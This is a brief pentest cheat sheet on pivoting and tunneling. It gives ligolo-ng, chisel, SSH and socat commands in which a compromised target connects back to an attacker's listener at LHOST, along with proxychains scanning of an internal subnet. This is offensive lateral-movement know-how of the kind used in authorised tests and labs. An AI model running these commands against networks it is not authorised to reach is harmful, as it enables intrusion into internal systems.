# Pivoting & tunneling — quick reference

> `tunnel` prints these with your LHOST filled in.

## ligolo-ng (preferred — full L3, no proxychains)
```bash
# attacker, once per boot:
sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert                             # listener on :11601

# target:
./agent -connect <LHOST>:11601 -ignore-cert

# attacker, in the ligolo prompt:
session                                        # pick the agent
# then route the internal subnet through the tun:
sudo ip route add 172.16.5.0/24 dev ligolo
# now hit internal hosts directly — nmap/nxc/impacket all work natively
```
Double pivot: add a listener on the first agent (`listener_add`), point a second agent at it.

## chisel (reverse SOCKS — when you can't run ligolo)
```bash
./chisel server -p 8080 --reverse             # attacker
./chisel client <LHOST>:8080 R:1080:socks     # target
# /etc/proxychains4.conf:  socks5 127.0.0.1 1080
proxychains -q nxc smb 172.16.5.10 -u u -p p
```

## SSH (when you have creds/shell on a *nix pivot)
```bash
ssh -D 1080 user@pivot                        # dynamic SOCKS
ssh -L 8080:internal:80 user@pivot            # local forward
ssh -R 9001:127.0.0.1:9001 user@pivot         # reverse (bring a port to the pivot)
```

## Port-forward a single service (socat on the pivot)
```bash
socat TCP-LISTEN:8000,fork,reuseaddr TCP:172.16.5.10:80
```

Reminder: nmap through proxychains → use `-sT -Pn` (no SYN/UDP over SOCKS).
